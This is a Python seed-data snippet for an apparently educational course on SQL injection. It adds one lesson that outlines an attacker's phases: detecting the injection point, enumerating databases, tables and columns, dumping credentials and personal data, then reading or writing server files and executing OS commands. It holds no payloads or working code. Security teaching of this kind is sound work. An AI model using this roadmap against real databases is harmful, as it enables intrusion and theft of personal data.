    l5_1 = Lesson(module_id=m5.id, order_index=1, title="The Attacker's Roadmap", narrative="**Narrative**: *A skilled attacker follows a systematic process. They don't just dump data randomly — they map the database first, then surgically extract what they want.*", code_snippet="Phase 1: RECONNAISSANCE\\n  │  Detect injection point\\n  │  Identify database type (MySQL, PostgreSQL, etc.)\\n  │\\nPhase 2: ENUMERATION  \\n  │  List all databases\\n  │  List all tables in target database\\n  │  List all columns in target table\\n  │\\nPhase 3: EXTRACTION\\n  │  Dump sensitive data (credentials, PII, etc.)\\n  │\\nPhase 4: ESCALATION (if possible)\\n  │  Read server files\\n  │  Write files to server\\n  │  Execute OS commands", code_language="", table_data=None)
    db.session.add(l5_1)
